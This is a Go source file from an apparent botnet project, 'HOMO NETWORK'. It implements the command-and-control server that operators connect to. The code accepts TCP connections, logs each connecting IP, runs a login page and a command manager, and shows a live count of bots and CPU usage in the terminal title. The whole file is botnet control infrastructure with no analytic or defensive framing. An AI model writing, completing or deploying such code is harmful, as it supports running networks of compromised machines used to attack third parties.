package cnc

import (
	"fmt"
	"homo/network/config"
	"homo/network/server"
	"log"
	"net"
	"os"
	"strconv"

	"time"

	"github.com/fatih/color"
	"github.com/shirou/gopsutil/cpu"
)

var (
	Conns []net.Conn
)

func Start(c *config.Config) {
	NewCon := make(chan net.Conn)

	server, err := net.Listen("tcp", c.Cnc.Server+":"+c.Cnc.Port)

	if err != nil {
		color.HiRed("Fails to start server")
		os.Exit(0)
	}

	fmt.Println("[HOMO] Cnc ready: " + c.Cnc.Server + ":" + c.Cnc.Port)
	go func() {
		for {
			conn, err := server.Accept()
			if err != nil {
				continue
			}

			NewCon <- conn
		}
	}()

	for {
		select {
		case conn := <-NewCon:
			go newuser(conn)

		}
	}

}

func newuser(conn net.Conn) {

	Conns = append(Conns, conn)
	if addr, ok := conn.RemoteAddr().(*net.TCPAddr); ok {
		Log(" *_🌐 New connection_*||*IP: " + addr.IP.String() + "||Port: " + strconv.Itoa(addr.Port))
	}
	Print("\x1B[2J\x1B[H", conn)

	go title(conn)
	LoginPage(conn)

	cls(conn)
	CommandManager(conn)

}

func title(conn net.Conn) {
	for {
		count, _ := server.GetBots()
		_, err := conn.Write([]byte("\033]0;HOMO NETWORK | Bots: " + strconv.Itoa(count) + " | CPU: " + strconv.Itoa(int(cpuUsage())) + "\007"))
		if err != nil {
			return
		}
		time.Sleep(1 * time.Second)
	}
}

func cpuUsage() float64 {
	percent, err := cpu.Percent(time.Second, false)
	if err != nil {
		log.Fatal(err)
	}
	if int(percent[0]) == 0 {
		percent[0] = 1
	}
	return percent[0]
}
